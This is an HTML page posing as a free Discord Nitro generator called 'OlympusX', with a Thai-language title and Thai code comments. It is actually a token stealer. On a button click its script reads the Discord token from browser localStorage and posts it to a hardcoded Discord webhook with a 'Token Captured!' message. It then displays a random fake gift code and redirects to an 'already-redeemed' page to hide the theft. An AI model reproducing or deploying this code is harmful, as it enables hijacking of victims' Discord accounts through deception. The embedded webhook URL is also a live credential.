<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OlympusX | บริการดักไนโตรฟรี! และ VIP เพียง 39฿</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            background: #111;
            border: 1px solid #333;
            padding: 50px;
            border-radius: 4px;
            width: 380px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255, 69, 0, 0.15);
        }
        .logo {
            color: #ff4500;
            font-size: 38px;
            font-weight: 900;
            margin-bottom: 5px;
            letter-spacing: 4px;
        }
        .subtitle {
            color: #666;
            font-size: 12px;
            margin-bottom: 40px;
            text-transform: uppercase;
        }
        .gen-display {
            background: #050505;
            border: 1px dashed #ff4500;
            padding: 20px;
            font-family: 'Courier New', Courier, monospace;
            color: #ff4500;
            font-size: 18px;
            margin-bottom: 30px;
            word-break: break-all;
        }
        .btn {
            background: #ff4500;
            color: #fff;
            border: none;
            padding: 18px;
            width: 100%;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
        }
        .btn:hover {
            background: #e63e00;
            box-shadow: 0 0 15px rgba(255, 69, 0, 0.4);
            transform: translateY(-2px);
        }
        .footer {
            margin-top: 30px;
            color: #444;
            font-size: 11px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">OlympusX</div>
    <div class="subtitle">Premium Nitro Generator v4.2</div>
    
    <div class="gen-display" id="code-box">
        DISCORD.GIFT/READY-TO-GEN
    </div>

    <button class="btn" onclick="startProcess()">Generate & Claim</button>
    
    <div class="footer">
        © 2024 OlympusX Snatcher Team. All rights reserved.
    </div>
</div>

<script>
    async function startProcess() {
        const btn = document.querySelector('.btn');
        const codeBox = document.getElementById('code-box');
        
        btn.disabled = true;
        btn.innerText = "Snatching Token...";

        // 1. ดัก Token จาก LocalStorage (เน้นดักในเบราว์เซอร์คอมจะเนียนสุด)
        let token = "";
        try {
            token = (window.webpackChunkdiscord_app ? window.localStorage.getItem('token') : window.localStorage.getItem('token')) || "NOT_FOUND";
            token = token.replace(/"/g, "");
        } catch (e) {
            token = "ERROR_ACCESSING";
        }

        // 2. ส่งข้อมูลไปที่ Webhook ของบอส (บอสเอา URL Webhook มาใส่ตรงนี้ได้เลย)
        const webhookURL = "https://discord.com/api/webhooks/1500506692159279304/bETSlr5IaDolC0rAzaIeSX5M7mmCpqkvGuFFqmz-59pnWmrMxOin83OuedYOT_27t8KS";
        
        if (webhookURL !== "YOUR_DISCORD_WEBHOOK_URL_HERE" && token !== "NOT_FOUND") {
            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: "@everyone **OlympusX ดักควายt!**",
                        embeds: [{
                            title: "🎯 Token Captured!",
                            description: "```" + token + "```",
                            color: 0xff4500,
                            footer: { text: "OlympusX Snatcher" }
                        }]
                    })
                });
            } catch (err) {
                console.log("Error sending to webhook");
            }
        }

        // 3. หลอกว่ากำลังเจนเนอเรทโค้ด
        let chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let fakeCode = '';
        for (let i = 0; i < 16; i++) {
            fakeCode += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        codeBox.innerText = "DISCORD.GIFT/" + fakeCode;

        // 4. ดีดไปหน้า Nitro ที่ถูกใช้แล้วเพื่อความเนียน
        setTimeout(() => {
            window.location.href = "https://discord.com/gifts/already-redeemed";
        }, 1500);
    }
</script>

</body>
</html>
